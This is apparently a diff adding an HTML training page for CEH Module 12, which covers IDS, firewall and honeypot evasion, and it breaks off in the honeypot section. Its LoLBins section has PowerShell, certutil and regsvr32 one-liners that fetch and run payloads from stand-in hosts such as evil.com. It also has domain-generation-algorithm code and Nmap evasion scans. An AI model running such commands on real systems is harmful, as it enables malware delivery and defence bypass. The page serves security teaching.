@@ -1,0 +1,1728 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CEH v13 Module 12: Evading IDS, Firewalls, and Honeypots</title>
+    <style>
+        :root {
+            --primary-color: #2c3e50;
+            --secondary-color: #3498db;
+            --accent-color: #e74c3c;
+            --success-color: #27ae60;
+            --warning-color: #f39c12;
+            --dark-bg: #1a1a1a;
+            --card-bg: #ffffff;
+            --text-primary: #2c3e50;
+            --text-secondary: #7f8c8d;
+            --border-color: #bdc3c7;
+            --gradient-primary: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            --gradient-secondary: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            --gradient-success: linear-gradient(135deg, #4ecdc4 0%, #44a08d 100%);
+            --gradient-warning: linear-gradient(135deg, #ffecd2 0%, #fcb69f 100%);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            line-height: 1.6;
+            color: var(--text-primary);
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .header {
+            background: var(--gradient-primary);
+            color: white;
+            padding: 40px 20px;
+            text-align: center;
+            border-radius: 15px;
+            margin-bottom: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        }
+
+        .header h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            font-weight: 700;
+        }
+
+        .header p {
+            font-size: 1.2rem;
+            margin-bottom: 20px;
+            opacity: 0.9;
+        }
+
+        .progress-container {
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 50px;
+            padding: 4px;
+            margin: 20px auto;
+            max-width: 400px;
+        }
+
+        .progress-bar {
+            background: var(--gradient-success);
+            height: 20px;
+            border-radius: 50px;
+            width: 0%;
+            transition: width 0.5s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.8rem;
+            font-weight: 600;
+            color: white;
+        }
+
+        .navigation {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 30px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        .nav-btn {
+            background: var(--card-bg);
+            color: var(--text-primary);
+            border: none;
+            padding: 12px 20px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 0.9rem;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            border: 2px solid transparent;
+        }
+
+        .nav-btn:hover {
+            background: var(--gradient-primary);
+            color: white;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
+        }
+
+        .nav-btn.active {
+            background: var(--gradient-primary);
+            color: white;
+            transform: translateY(-2px);
+        }
+
+        .content-area {
+            background: var(--card-bg);
+            border-radius: 15px;
+            padding: 40px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            min-height: 600px;
+        }
+
+        .module-section {
+            display: none;
+            animation: fadeIn 0.5s ease-in;
+        }
+
+        .module-section.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .section-title {
+            font-size: 2.2rem;
+            margin-bottom: 25px;
+            color: var(--primary-color);
+            text-align: center;
+            position: relative;
+        }
+
+        .section-title::after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 60px;
+            height: 4px;
+            background: var(--gradient-primary);
+            border-radius: 2px;
+        }
+
+        .card {
+            background: var(--card-bg);
+            border-radius: 12px;
+            padding: 25px;
+            margin: 20px 0;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
+            border: 1px solid var(--border-color);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.15);
+        }
+
+        .card h3 {
+            color: var(--primary-color);
+            margin-bottom: 15px;
+            font-size: 1.4rem;
+        }
+
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin: 20px 0;
+        }
+
+        .feature-card {
+            background: var(--gradient-primary);
+            color: white;
+            padding: 25px;
+            border-radius: 12px;
+            text-align: center;
+            transition: transform 0.3s ease;
+        }
+
+        .feature-card:hover {
+            transform: translateY(-5px);
+        }
+
+        .feature-card h4 {
+            margin-bottom: 15px;
+            font-size: 1.2rem;
+        }
+
+        .technique-showcase {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 20px;
+            margin: 25px 0;
+        }
+
+        .technique-card {
+            padding: 20px;
+            border-radius: 10px;
+            transition: transform 0.3s ease;
+            color: white;
+        }
+
+        .technique-card:hover {
+            transform: scale(1.02);
+        }
+
+        .technique-card.evasion { 
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+        }
+        
+        .technique-card.detection { 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        }
+        
+        .technique-card.countermeasure { 
+            background: linear-gradient(135deg, #4ecdc4 0%, #44a08d 100%);
+        }
+
+        .technique-card h4 {
+            margin-bottom: 15px;
+            font-size: 1.2rem;
+        }
+
+        .technique-card p {
+            margin: 8px 0;
+            line-height: 1.6;
+        }
+
+        .btn {
+            background: var(--gradient-primary);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 1rem;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            margin: 10px;
+            text-decoration: none;
+            display: inline-block;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
+        }
+
+        .btn-success { background: var(--gradient-success); }
+        .btn-warning { background: var(--gradient-warning); color: #333; }
+        .btn-danger { background: linear-gradient(135deg, #ff6b6b 0%, #ee5a52 100%); }
+
+        .quiz-container {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        .question {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 15px 0;
+            border-left: 4px solid var(--secondary-color);
+        }
+
+        .question h4 {
+            margin-bottom: 15px;
+            color: var(--primary-color);
+        }
+
+        .option {
+            margin: 10px 0;
+            padding: 10px;
+            background: #f1f2f6;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+
+        .option:hover {
+            background: #ddd;
+        }
+
+        .option.selected {
+            background: var(--secondary-color);
+            color: white;
+        }
+
+        .option.correct {
+            background: var(--success-color);
+            color: white;
+        }
+
+        .option.incorrect {
+            background: var(--accent-color);
+            color: white;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            animation: modalFadeIn 0.3s ease;
+        }
+
+        @keyframes modalFadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .modal-content {
+            background: white;
+            margin: 2% auto;
+            padding: 30px;
+            border-radius: 15px;
+            width: 90%;
+            max-width: 800px;
+            max-height: 90vh;
+            overflow-y: auto;
+            position: relative;
+            animation: modalSlideIn 0.3s ease;
+        }
+
+        @keyframes modalSlideIn {
+            from { transform: translateY(-50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+            position: absolute;
+            top: 15px;
+            right: 25px;
+        }
+
+        .close:hover {
+            color: var(--accent-color);
+        }
+
+        .tool-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 15px;
+            margin: 20px 0;
+        }
+
+        .tool-item {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            border-left: 4px solid var(--secondary-color);
+        }
+
+        .tool-item h5 {
+            color: var(--primary-color);
+            margin-bottom: 8px;
+        }
+
+        .lab-container {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 25px;
+            border-radius: 12px;
+            margin: 20px 0;
+        }
+
+        .lab-step {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 15px;
+            border-radius: 8px;
+            margin: 10px 0;
+            border-left: 4px solid #fff;
+        }
+
+        .code-snippet {
+            background: #2c3e50;
+            color: #ecf0f1;
+            padding: 15px;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            overflow-x: auto;
+            margin: 10px 0;
+            font-size: 0.9rem;
+        }
+
+        .highlight {
+            background: linear-gradient(135deg, #ffecd2 0%, #fcb69f 100%);
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            border-left: 5px solid var(--warning-color);
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin: 20px 0;
+        }
+
+        .stat-card {
+            background: var(--gradient-primary);
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+        }
+
+        .stat-number {
+            font-size: 2.5rem;
+            font-weight: 700;
+            margin-bottom: 5px;
+        }
+
+        .certification-preview {
+            background: var(--gradient-success);
+            color: white;
+            padding: 40px;
+            border-radius: 15px;
+            text-align: center;
+            margin: 30px 0;
+        }
+
+        .resource-links {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin: 20px 0;
+        }
+
+        .resource-card {
+            background: var(--card-bg);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            border: 1px solid var(--border-color);
+        }
+
+        .resource-card h4 {
+            color: var(--primary-color);
+            margin-bottom: 15px;
+        }
+
+        .resource-card a {
+            color: var(--secondary-color);
+            text-decoration: none;
+            display: block;
+            margin: 5px 0;
+        }
+
+        .resource-card a:hover {
+            text-decoration: underline;
+        }
+
+        .info-cards {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin: 20px 0;
+        }
+
+        .info-card {
+            background: white;
+            color: var(--text-primary);
+            padding: 20px;
+            border-radius: 10px;
+            border-left: 4px solid var(--secondary-color);
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .info-card h4 {
+            color: var(--primary-color);
+            margin-bottom: 15px;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 10px;
+            }
+
+            .header {
+                padding: 30px 15px;
+            }
+
+            .header h1 {
+                font-size: 2rem;
+            }
+
+            .content-area {
+                padding: 20px;
+            }
+
+            .navigation {
+                gap: 10px;
+            }
+
+            .nav-btn {
+                padding: 8px 15px;
+                font-size: 0.8rem;
+            }
+
+            .feature-grid,
+            .technique-showcase,
+            .tool-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: #f1f1f1;
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--secondary-color);
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--primary-color);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🛡️ CEH v13 Module 12</h1>
+            <p>Evading IDS, Firewalls, and Honeypots</p>
+            <div class="progress-container">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+            <p id="progressText">Progress: 0% Complete</p>
+            <div style="margin-top: 15px; font-size: 0.9em; color: rgba(255,255,255,0.8);">
+                <span style="background: rgba(255,255,255,0.1); padding: 8px 15px; border-radius: 20px; margin: 0 5px;">
+                    ← → Navigate Sections
+                </span>
+                <span style="background: rgba(255,255,255,0.1); padding: 8px 15px; border-radius: 20px; margin: 0 5px;">
+                    Esc Close Modal
+                </span>
+            </div>
+        </div>
+
+        <div class="navigation">
+            <button class="nav-btn active" data-section="overview">📋 Overview</button>
+            <button class="nav-btn" data-section="ids-concepts">🔍 IDS Concepts</button>
+            <button class="nav-btn" data-section="firewall-basics">🔥 Firewall Basics</button>
+            <button class="nav-btn" data-section="evasion-techniques">🎭 Evasion Techniques</button>
+            <button class="nav-btn" data-section="modern-evasion">🤖 Modern Evasion</button>
+            <button class="nav-btn" data-section="honeypots">🍯 Honeypots</button>
+            <button class="nav-btn" data-section="detection-methods">🔬 Detection Methods</button>
+            <button class="nav-btn" data-section="countermeasures">🛡️ Countermeasures</button>
+            <button class="nav-btn" data-section="tools">🔧 Tools</button>
+            <button class="nav-btn" data-section="labs">🧪 Labs</button>
+            <button class="nav-btn" data-section="quiz">📝 Assessment</button>
+
+        </div>
+
+        <div class="content-area">
+            <!-- Overview Section -->
+            <div id="overview" class="module-section active">
+                <h2 class="section-title">🎯 Module 12 Overview</h2>
+                
+                <div class="card">
+                    <h3>🛡️ Welcome to Advanced Security Evasion</h3>
+                    <p>Welcome to CEH v13 Module 12! This comprehensive module covers the sophisticated techniques used to evade modern security systems, including Intrusion Detection Systems (IDS), firewalls, and honeypots. Understanding these evasion techniques is crucial for ethical hackers and security professionals to strengthen organizational defenses.</p>
+                </div>
+
+                <div class="stats-grid">
+                    <div class="stat-card">
+                        <div class="stat-number">12</div>
+                        <div>Main Topics</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-number">25+</div>
+                        <div>Evasion Techniques</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-number">15+</div>
+                        <div>Security Tools</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-number">180</div>
+                        <div>Minutes Content</div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🎯 Learning Objectives</h3>
+                    <p>By the end of this module, you will:</p>
+                    <ul style="margin: 15px 0; padding-left: 25px; line-height: 1.8;">
+                        <li>Understand IDS, firewall, and honeypot technologies and their limitations</li>
+                        <li>Master traditional and modern evasion techniques</li>
+                        <li>Learn Domain Generation Algorithms (DGA) and process injection methods</li>
+                        <li>Implement endpoint security bypass using Living-off-the-Land Binaries (LoLBins)</li>
+                        <li>Detect and analyze honeypot deployments</li>
+                        <li>Develop comprehensive countermeasures against evasion attacks</li>
+                        <li>Use professional penetration testing tools for security assessment</li>
+                    </ul>
+                </div>
+
+                <div class="feature-grid">
+                    <div class="feature-card">
+                        <h4>🔍 IDS Evasion</h4>
+                        <p>Learn to bypass network and host-based intrusion detection systems using fragmentation, encoding, and timing attacks.</p>
+                    </div>
+                    <div class="feature-card">
+                        <h4>🔥 Firewall Bypass</h4>
+                        <p>Master techniques to circumvent firewall rules using source routing, tunneling, and application-layer attacks.</p>
+                    </div>
+                    <div class="feature-card">
+                        <h4>🍯 Honeypot Detection</h4>
+                        <p>Identify and analyze honeypot deployments to avoid security traps during penetration testing.</p>
+                    </div>
+                    <div class="feature-card">
+                        <h4>🤖 AI-Driven Evasion</h4>
+                        <p>Explore modern AI-powered evasion techniques and automated attack methodologies.</p>
+                    </div>
+                </div>
+
+                <div class="highlight">
+                    <h4>⚠️ Ethical Considerations</h4>
+                    <p>All techniques presented in this module are for educational and authorized testing purposes only. Unauthorized use of these methods against systems you do not own or have explicit permission to test is illegal and unethical. Always maintain proper authorization documentation and follow responsible disclosure practices.</p>
+                </div>
+
+                <button class="btn btn-success" data-next="ids-concepts">Next: IDS Concepts →</button>
+            </div>
+
+            <!-- IDS Concepts Section -->
+            <div id="ids-concepts" class="module-section">
+                <h2 class="section-title">🔍 Intrusion Detection System Concepts</h2>
+
+                <div class="card">
+                    <h3>🎯 What is an Intrusion Detection System?</h3>
+                    <p>An Intrusion Detection System (IDS) is a security technology that monitors network traffic or system activities for malicious behavior and policy violations. IDS serves as an early warning system, alerting administrators to potential security incidents.</p>
+                </div>
+
+                <div class="technique-showcase">
+                    <div class="technique-card detection">
+                        <h4>🌐 Network-Based IDS (NIDS)</h4>
+                        <p><strong>Function:</strong> Monitors network traffic in real-time</p>
+                        <p><strong>Deployment:</strong> Network segments, routers, switches</p>
+                        <p><strong>Detection:</strong> Packet analysis, protocol anomalies</p>
+                        <p><strong>Examples:</strong> Snort, Suricata, Zeek (Bro)</p>
+                    </div>
+                    <div class="technique-card evasion">
+                        <h4>🖥️ Host-Based IDS (HIDS)</h4>
+                        <p><strong>Function:</strong> Monitors individual host activities</p>
+                        <p><strong>Deployment:</strong> Individual servers and workstations</p>
+                        <p><strong>Detection:</strong> File integrity, log analysis, system calls</p>
+                        <p><strong>Examples:</strong> OSSEC, Samhain, Tripwire</p>
+                    </div>
+                    <div class="technique-card countermeasure">
+                        <h4>🔄 Hybrid IDS</h4>
+                        <p><strong>Function:</strong> Combines NIDS and HIDS capabilities</p>
+                        <p><strong>Deployment:</strong> Enterprise-wide deployment</p>
+                        <p><strong>Detection:</strong> Comprehensive monitoring</p>
+                        <p><strong>Examples:</strong> AlienVault OSSIM, IBM QRadar</p>
+                    </div>
+                </div>
+
+                <button class="btn btn-success" data-next="firewall-basics">Next: Firewall Basics →</button>
+            </div>
+
+            <!-- Firewall Basics Section -->
+            <div id="firewall-basics" class="module-section">
+                <h2 class="section-title">🔥 Firewall Fundamentals</h2>
+
+                <div class="card">
+                    <h3>🛡️ Firewall Overview</h3>
+                    <p>A firewall is a network security device that monitors and controls incoming and outgoing network traffic based on predetermined security rules. Firewalls establish a barrier between trusted internal networks and untrusted external networks.</p>
+                </div>
+
+                <div class="technique-showcase">
+                    <div class="technique-card evasion">
+                        <h4>📦 Packet Filtering Firewalls</h4>
+                        <p><strong>Function:</strong> Filter based on IP addresses, ports, protocols</p>
+                        <p><strong>OSI Layer:</strong> Network Layer (Layer 3)</p>
+                        <p><strong>Speed:</strong> Very fast processing</p>
+                        <p><strong>Limitation:</strong> No application context awareness</p>
+                    </div>
+                    <div class="technique-card detection">
+                        <h4>🔄 Stateful Inspection Firewalls</h4>
+                        <p><strong>Function:</strong> Track connection state and context</p>
+                        <p><strong>OSI Layer:</strong> Transport Layer (Layer 4)</p>
+                        <p><strong>Speed:</strong> Moderate processing overhead</p>
+                        <p><strong>Advantage:</strong> Connection state awareness</p>
+                    </div>
+                    <div class="technique-card countermeasure">
+                        <h4>🔍 Application Layer Firewalls</h4>
+                        <p><strong>Function:</strong> Deep packet inspection and application control</p>
+                        <p><strong>OSI Layer:</strong> Application Layer (Layer 7)</p>
+                        <p><strong>Speed:</strong> Higher processing overhead</p>
+                        <p><strong>Advantage:</strong> Advanced threat detection</p>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>📋 Firewall Rule Processing</h3>
+                    <div class="code-snippet">
+# Example iptables rules
+# Allow incoming SSH connections
+iptables -A INPUT -p tcp --dport 22 -j ACCEPT
+
+# Allow incoming HTTP/HTTPS connections
+iptables -A INPUT -p tcp --dport 80 -j ACCEPT
+iptables -A INPUT -p tcp --dport 443 -j ACCEPT
+
+# Block all other incoming connections
+iptables -A INPUT -j DROP
+
+# Allow all outgoing connections
+iptables -A OUTPUT -j ACCEPT
+                    </div>
+                    <p>Firewall rules are processed in order, with the first matching rule determining the action. Understanding rule precedence is crucial for both configuration and evasion.</p>
+                </div>
+
+                <div class="card">
+                    <h3>⚠️ Firewall Limitations</h3>
+                    <div class="tool-grid">
+                        <div class="tool-item">
+                            <h5>🔍 Limited Application Visibility</h5>
+                            <p>Traditional firewalls cannot inspect encrypted traffic or understand application context.</p>
+                        </div>
+                        <div class="tool-item">
+                            <h5>🕳️ Port-Based Filtering</h5>
+                            <p>Applications using dynamic ports or port hopping can bypass port-based rules.</p>
+                        </div>
+                        <div class="tool-item">
+                            <h5>🔀 Protocol Tunneling</h5>
+                            <p>Protocols can be tunneled over allowed ports (HTTP/HTTPS) to bypass restrictions.</p>
+                        </div>
+                        <div class="tool-item">
+                            <h5>🎭 Evasion Techniques</h5>
+                            <p>Source routing, fragmentation, and timing attacks can circumvent firewall rules.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <button class="btn btn-success" data-next="evasion-techniques">Next: Evasion Techniques →</button>
+            </div>
+
+            <!-- Evasion Techniques Section -->
+            <div id="evasion-techniques" class="module-section">
+                <h2 class="section-title">🎭 Traditional Evasion Techniques</h2>
+
+                <div class="card">
+                    <h3>🧩 Fragmentation Attacks</h3>
+                    <p>Fragmentation attacks split malicious payloads across multiple packets to evade signature-based detection systems. IDS may not reassemble fragments correctly, allowing attacks to slip through.</p>
+                </div>
+
+                <div class="technique-showcase">
+                    <div class="technique-card evasion">
+                        <h4>📦 IP Fragmentation</h4>
+                        <p><strong>Method:</strong> Split IP packets into smaller fragments</p>
+                        <p><strong>Target:</strong> Network-based IDS and firewalls</p>
+                        <p><strong>Tool:</strong> fragroute, Nmap -f flag</p>
+                        <div class="code-snippet">
+# Nmap fragmentation scan
+nmap -sS -f -D RND:10 target.com
+
+# Multiple fragmentation levels
+nmap -sS -ff target.com
+                        </div>
+                    </div>
+                    <div class="technique-card evasion">
+                        <h4>🔀 Overlapping Fragments</h4>
+                        <p><strong>Method:</strong> Create overlapping TCP sequence numbers</p>
+                        <p><strong>Impact:</strong> Confuse IDS reassembly algorithms</p>
+                        <p><strong>Detection:</strong> Difficult without proper fragment tracking</p>
+                        <div class="code-snippet">
+# Generate overlapping fragments
+fragroute -f "ip_frag 8 overlap"
+                        </div>
+                    </div>
+                    <div class="technique-card evasion">
+                        <h4>⏱️ Time-to-Live (TTL) Attacks</h4>
+                        <p><strong>Method:</strong> Manipulate TTL values for selective delivery</p>
+                        <p><strong>Requirement:</strong> Knowledge of network topology</p>
+                        <p><strong>Effect:</strong> Packets reach target but not IDS</p>
+                        <div class="code-snippet">
+# TTL manipulation with Nmap
+nmap -sS --ttl 64 target.com
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🎨 Encoding and Obfuscation</h3>
+                    <div class="technique-showcase">
+                        <div class="technique-card detection">
+                            <h4>🌐 URL Encoding</h4>
+                            <p>Transform characters into percent-encoded format</p>
+                            <div class="code-snippet">
+# Normal: /admin/login
+# Encoded: %2F%61%64%6D%69%6E%2F%6C%6F%67%69%6E
+                            </div>
+                        </div>
+                        <div class="technique-card evasion">
+                            <h4>🔤 Unicode Encoding</h4>
+                            <p>Use Unicode representations to bypass ASCII filters</p>
+                            <div class="code-snippet">
+# ASCII: &lt;script&gt;
+# Unicode: \u003cscript\u003e
+                            </div>
+                        </div>
+                        <div class="technique-card countermeasure">
+                            <h4>🔐 Base64 Encoding</h4>
+                            <p>Encode payloads in Base64 to avoid signature detection</p>
+                            <div class="code-snippet">
+# Original: alert('xss')
+# Base64: YWxlcnQoJ3hzcycp
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🌐 Protocol-Level Evasion</h3>
+                    <div class="tool-grid">
+                        <div class="tool-item">
+                            <h5>🔀 Source Routing</h5>
+                            <p>Specify packet routing path to bypass firewall rules by controlling traffic flow through specific network nodes.</p>
+                        </div>
+                        <div class="tool-item">
+                            <h5>🕳️ Proxy Chains</h5>
+                            <p>Route traffic through multiple proxy servers to obscure origin and evade IP-based blocking.</p>
+                        </div>
+                        <div class="tool-item">
+                            <h5>🔄 Port Hopping</h5>
+                            <p>Rapidly change source/destination ports to confuse port-based filtering rules.</p>
+                        </div>
+                        <div class="tool-item">
+                            <h5>📡 Protocol Tunneling</h5>
+                            <p>Encapsulate restricted protocols within allowed protocols (DNS, HTTP, ICMP tunneling).</p>
+                        </div>
+                    </div>
+                </div>
+
+                <button class="btn btn-success" data-next="modern-evasion">Next: Modern Evasion →</button>
+            </div>
+
+            <!-- Modern Evasion Section -->
+            <div id="modern-evasion" class="module-section">
+                <h2 class="section-title">🤖 Modern Evasion Techniques</h2>
+
+                <div class="card">
+                    <h3>🧬 Domain Generation Algorithms (DGA)</h3>
+                    <p>Domain Generation Algorithms are sophisticated techniques used by modern malware to dynamically create large numbers of domain names for command and control (C2) communication. This makes it extremely difficult for security teams to block malicious domains effectively.</p>
+                </div>
+
+                <div class="technique-showcase">
+                    <div class="technique-card evasion">
+                        <h4>🎲 Pseudorandom DGA</h4>
+                        <p><strong>Method:</strong> Use mathematical algorithms with seeds</p>
+                        <p><strong>Seed Types:</strong> Date, system info, hardcoded values</p>
+                        <p><strong>Example:</strong> Conficker generated 250-50,000 domains daily</p>
+                        <div class="code-snippet">
+# Simple DGA example (educational)
+import hashlib
+from datetime import datetime
+
+def generate_domains(seed, count=100):
+    domains = []
+    for i in range(count):
+        hash_input = f"{seed}{i}".encode()
+        hash_hex = hashlib.md5(hash_input).hexdigest()[:12]
+        domain = f"{hash_hex}.com"
+        domains.append(domain)
+    return domains
+
+# Generate domains for today
+today = datetime.now().strftime("%Y-%m-%d")
+domains = generate_domains(today, 50)
+                        </div>
+                    </div>
+                    <div class="technique-card countermeasure">
+                        <h4>📚 Dictionary-Based DGA</h4>
+                        <p><strong>Method:</strong> Combine dictionary words</p>
+                        <p><strong>Advantage:</strong> More legitimate-looking domains</p>
+                        <p><strong>Example:</strong> "bluecarhousepaper.net"</p>
+                        <div class="code-snippet">
+# Dictionary DGA example
+import random
+
+words = ['blue', 'car', 'house', 'paper', 'tree', 'water']
+tlds = ['.com', '.org', '.net', '.info']
+
+def generate_dict_domains(count=50):
+    domains = []
+    for _ in range(count):
+        word_count = random.randint(2, 4)
+        domain_words = random.choices(words, k=word_count)
+        tld = random.choice(tlds)
+        domain = ''.join(domain_words) + tld
+        domains.append(domain)
+    return domains
+                        </div>
+                    </div>
+                    <div class="technique-card detection">
+                        <h4>🎯 High-Collision DGA</h4>
+                        <p><strong>Method:</strong> Generate domains likely to collide with legitimate ones</p>
+                        <p><strong>Purpose:</strong> Increase detection difficulty</p>
+                        <p><strong>Challenge:</strong> Requires advanced ML for detection</p>
+                        <div class="code-snippet">
+# High-collision DGA pattern
+common_prefixes = ['www', 'mail', 'ftp', 'admin']
+common_suffixes = ['service', 'update', 'secure']
+
+def generate_collision_domains():
+    prefix = random.choice(common_prefixes)
+    suffix = random.choice(common_suffixes)
+    middle = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=6))
+    return f"{prefix}{middle}{suffix}.com"
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>💉 Process Injection Techniques</h3>
+                    <p>Process injection allows malware to execute code within the address space of legitimate processes, effectively hiding malicious activities from security monitoring systems.</p>
+                    
+                    <div class="technique-showcase">
+                        <div class="technique-card detection">
+                            <h4>🔧 DLL Injection</h4>
+                            <p><strong>Method:</strong> Inject malicious DLL into target process</p>
+                            <p><strong>API:</strong> LoadLibrary, SetWindowsHookEx</p>
+                            <p><strong>Target:</strong> System processes like explorer.exe</p>
+                        </div>
+                        <div class="technique-card evasion">
+                            <h4>🧠 Process Hollowing</h4>
+                            <p><strong>Method:</strong> Create suspended process, replace with malicious code</p>
+                            <p><strong>API:</strong> CreateProcess, NtUnmapViewOfSection</p>
+                            <p><strong>Advantage:</strong> Legitimate process name in task list</p>
+                        </div>
+                        <div class="technique-card countermeasure">
+                            <h4>⚡ Reflective DLL Loading</h4>
+                            <p><strong>Method:</strong> Load DLL from memory without touching disk</p>
+                            <p><strong>Advantage:</strong> No file system artifacts</p>
+                            <p><strong>Detection:</strong> Very difficult with traditional AV</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🔧 Living-off-the-Land Binaries (LoLBins)</h3>
+                    <p>LoLBins are legitimate system binaries that can be abused for malicious purposes. Since these are trusted system files, they often bypass security controls and application whitelisting.</p>
+                    
+                    <div class="tool-grid">
+                        <div class="tool-item">
+                            <h5>💻 PowerShell</h5>
+                            <div class="code-snippet">
+# Download and execute script from memory
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')"
+                            </div>
+                        </div>
+                        <div class="tool-item">
+                            <h5>🌐 Certutil</h5>
+                            <div class="code-snippet">
+# Download file using certutil
+certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe
+                            </div>
+                        </div>
+                        <div class="tool-item">
+                            <h5>📝 WMIC</h5>
+                            <div class="code-snippet">
+# Execute remote command using WMIC
+wmic process call create "cmd.exe /c malicious_command"
+                            </div>
+                        </div>
+                        <div class="tool-item">
+                            <h5>🔍 Regsvr32</h5>
+                            <div class="code-snippet">
+# Execute scriptlet from remote URL
+regsvr32 /u /n /s /i:http://evil.com/file.sct scrobj.dll
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <button class="btn btn-success" data-next="honeypots">Next: Honeypots →</button>
+            </div>
+
+            <!-- Honeypots Section -->
+            <div id="honeypots" class="module-section">
+                <h2 class="section-title">🍯 Honeypots and Deception</h2>
+
+                <div class="card">
+                    <h3>🎯 Understanding Honeypots</h3>
+                    <p>Honeypots are security mechanisms set up to detect, deflect, or counteract unauthorized access attempts. They act as decoy systems designed to lure attackers away from legitimate assets while gathering intelligence about attack methods.</p>
+                </div>
+
+                <div class="technique-showcase">
+                    <div class="technique-card detection">
+                        <h4>🐝 Low-Interaction Honeypots</h4>
+                        <p><strong>Function:</strong> Simulate services and systems</p>
+                        <p><strong>Resources:</strong> Minimal system resources required</p>
+                        <p><strong>Risk:</strong> Low risk of compromise</p>
+                        <p><strong>Examples:</strong> Honeyd, Kippo, Conpot</p>
+                    </div>
